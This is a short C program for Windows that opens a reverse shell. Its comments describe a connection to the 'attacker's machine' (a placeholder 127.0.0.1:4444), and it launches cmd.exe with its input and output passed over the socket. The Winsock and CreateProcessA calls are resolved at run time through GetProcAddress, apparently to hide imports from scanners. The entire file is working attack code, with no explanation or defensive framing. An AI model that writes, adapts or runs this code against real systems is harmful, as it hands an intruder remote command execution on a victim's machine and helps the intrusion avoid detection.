#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFOA sui;
PROCESS_INFORMATION pi;

typedef int(WINAPI *WSAStartup_t)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET(WINAPI *WSASocketA_t)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef u_short(WINAPI *htons_t)(u_short hostshort);
typedef unsigned long(WINAPI *inet_addr_t)(const char *cp);
typedef int(WINAPI *WSAConnect_t)(SOCKET s, const sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
typedef BOOL(WINAPI *CreateProcessA_t)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
int main(int argc, char* argv[])
{
HMODULE hKernel32 = LoadLibraryA("Kernel32.dll");
HMODULE hWs2_32 = LoadLibraryA("Ws2_32.dll");
WSAStartup_t pWSAStartup = (WSAStartup_t)GetProcAddress(hWs2_32, "WSAStartup");
WSASocketA_t pWSASocketA = (WSASocketA_t)GetProcAddress(hWs2_32, "WSASocketA");
htons_t phtons = (htons_t)GetProcAddress(hWs2_32, "htons");
inet_addr_t pinet_addr = (inet_addr_t)GetProcAddress(hWs2_32, "inet_addr");
WSAConnect_t pWSAConnect = (WSAConnect_t)GetProcAddress(hWs2_32, "WSAConnect");
CreateProcessA_t pCreateProcessA = (CreateProcessA_t)GetProcAddress(hKernel32, "CreateProcessA");

  // listener ip, port on attacker's machine
  char ip[] = "127.0.0.1";
  short port = 4444;

  // init socket lib
  pWSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = phtons(port);
  hax.sin_addr.s_addr = pinet_addr(ip);

  // connect to remote host
  pWSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  // start cmd.exe with redirected streams
  pCreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}